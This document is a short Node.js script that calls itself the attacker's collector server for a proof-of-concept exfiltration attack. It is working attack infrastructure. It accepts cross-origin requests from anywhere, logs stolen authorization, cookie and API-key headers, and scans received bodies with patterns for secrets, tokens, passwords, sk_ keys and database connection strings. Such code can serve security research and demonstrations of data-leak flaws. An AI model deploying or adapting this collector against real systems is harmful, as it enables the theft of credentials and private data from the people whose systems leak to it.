#!/usr/bin/env node
'use strict';

/**
 * Attacker collector server — receives exfiltrated data from the PoC.
 * Logs all incoming requests (GET/POST) with timestamp, headers, and payload.
 *
 * Usage: node collector.cjs [port]
 */

const http = require('node:http');
const PORT = parseInt(process.argv[2] || '4445', 10);

let requestCount = 0;

const server = http.createServer((req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    });
    return res.end();
  }

  let body = '';
  req.on('data', (chunk) => (body += chunk));
  req.on('end', () => {
    requestCount++;
    const ts = new Date().toISOString();

    console.log('\n' + '='.repeat(60));
    console.log(`  EXFILTRATED DATA RECEIVED (#${requestCount})`);
    console.log(`  Time:     ${ts}`);
    console.log(`  Method:   ${req.method}`);
    console.log(`  Path:     ${req.url}`);
    console.log(`  Size:     ${body.length} bytes`);
    console.log('-'.repeat(60));

    const sensitiveHeaders = ['authorization', 'cookie', 'x-api-key'];
    for (const h of sensitiveHeaders) {
      if (req.headers[h]) console.log(`  Header:   ${h}: ${req.headers[h]}`);
    }

    console.log('-'.repeat(60));

    if (body) {
      try {
        const parsed = JSON.parse(body);
        console.log(JSON.stringify(parsed, null, 2));
      } catch {
        console.log(body);
      }
    } else {
      console.log('  (empty body)');
    }

    console.log('='.repeat(60) + '\n');

    // Check for leaked secrets in the body
    const secretPatterns = [
      /[A-Za-z0-9_]*(KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)[A-Za-z0-9_]*\s*[=:]\s*\S+/gi,
      /sk_[a-zA-Z0-9_]+/g,
      /postgresql:\/\/[^\s]+/g,
      /redis:\/\/[^\s]+/g,
    ];
    const leaks = [];
    for (const p of secretPatterns) {
      const matches = body.match(p);
      if (matches) leaks.push(...matches);
    }
    if (leaks.length > 0) {
      console.log('  *** SECRETS DETECTED ***');
      for (const leak of leaks) console.log(`    ${leak}`);
      console.log('');
    }

    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
    });
    res.end(JSON.stringify({ status: 'ok', received: requestCount }));
  });
});

server.listen(PORT, () => {
  console.log(`[collector] Listening on http://localhost:${PORT}`);
  console.log('[collector] Waiting for exfiltrated data...');
  console.log('[collector] Press Ctrl+C to stop.\n');
});
